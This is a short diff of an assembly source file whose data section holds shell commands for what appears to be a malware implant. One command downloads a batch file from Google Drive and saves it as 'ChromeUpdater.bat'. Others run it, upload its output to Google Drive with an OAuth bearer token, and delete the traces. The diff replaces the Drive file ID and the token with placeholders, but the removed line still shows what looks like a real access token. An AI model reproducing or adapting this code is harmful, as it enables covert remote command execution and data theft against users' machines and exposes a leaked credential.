@@ -197,8 +197,8 @@ _start:
     call r9
 
 section .data
-    cmd1: db "cmd /c curl -L ", 22h, "https://drive.google.com/uc?export=download&id=10SZeDUlI-IG4u1EXjP_VGUhdoQSAdYwS", 22h, " -o %temp%\ChromeUpdater.bat", 00h
+    cmd1: db "cmd /c curl -L ", 22h, "https://drive.google.com/uc?export=download&id={FILE-ID}", 22h, " -o %temp%\ChromeUpdater.bat", 00h
     cmd2: db "cmd /c %temp%\ChromeUpdater.bat > %temp%\ChromeUpdater.bin", 00h
-    cmd3: db "cmd /c curl -X POST -L -H ", 22h, "Authorization: Bearer ya29.a0AcM612zF139XYPBmGTJ0EroHPjdYnoNkppvbUc-AnkqsVGsiavAzqRNk2vLngCM1RmSgtYd9cwdLp87viYT8mwnyu91peagcOfa5CoQxm82iNcYl75A2sUcxqq-k1m-uoa5NA_GqGsqek6wWELEea5kJpI__0hf43z327z1CaCgYKATsSARISFQHGX2MiGp0J-yfcabTzwdUP2pLuGQ0175",22h, " -F ",22h,"metadata={name : 'output.txt'};type=application/json;charset=UTF-8", 22h, " -F ",22h, "file=@%temp%\ChromeUpdater.bin",22h, " ", 22h, "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",22h, 00h
+    cmd3: db "cmd /c curl -X POST -L -H ", 22h, "Authorization: Bearer {OAUTH2.0 TOKEN}",22h, " -F ",22h,"metadata={name : 'output.txt'};type=application/json;charset=UTF-8", 22h, " -F ",22h, "file=@%temp%\ChromeUpdater.bin",22h, " ", 22h, "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",22h, 00h
     cmd4: db "cmd /c del %temp%\ChromeUpdater.bin", 00h
     cmd5: db "cmd /c del %temp%\ChromeUpdater.bat"
